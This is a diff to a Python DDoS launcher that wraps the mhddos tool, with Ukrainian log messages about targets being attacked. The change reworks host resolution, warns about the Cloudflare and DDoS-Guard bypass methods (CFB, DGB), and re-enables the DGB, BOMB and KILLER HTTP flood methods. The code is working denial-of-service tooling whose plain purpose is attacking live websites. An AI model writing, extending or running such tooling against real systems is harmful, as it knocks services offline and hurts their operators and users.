@@ -26,11 +26,7 @@ MAX_DEFAULT_THREADS = 4000
 
 @lru_cache(maxsize=128)
 def resolve_host(url):
-    try:
-        return socket.gethostbyname(URL(url).host)
-    except socket.gaierror:
-        logger.error(f'{cl.FAIL}Ціль {url} недоступна і не буде атакована{cl.RESET}')
-        return None
+    return socket.gethostbyname(URL(url).host)
 
 
 class Targets:
@@ -153,12 +149,19 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
 
 def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debug):
     os.chdir('mhddos')
+    for bypass in ('CFB', 'DGB'):
+        if bypass in http_methods:
+            logger.warning(f'{cl.FAIL}Робота методу {bypass} не гарантована - слідкуйте за трафіком{cl.RESET}')
+
     while True:
-        targets = list(targets_iter)
-        targets = [
-            target for target in targets
-            if resolve_host(target)
-        ]
+        targets = []
+        for url in list(targets_iter):
+            try:
+                resolve_host(url)
+                targets.append(url)
+            except socket.gaierror:
+                logger.warning(f'{cl.FAIL}Ціль {url} недоступна і не буде атакована{cl.RESET}')
+
         if not targets:
             logger.error(f'{cl.FAIL}Не знайдено жодної доступної цілі{cl.RESET}')
             exit()
@@ -225,7 +228,7 @@ def init_argparse() -> argparse.ArgumentParser:
         nargs='+',
         type=str.upper,
         default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
-        choices=Methods.LAYER7_METHODS - {'DGB', 'BOMB', 'KILLER'},
+        choices=Methods.LAYER7_METHODS,
         help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
     )
     return parser
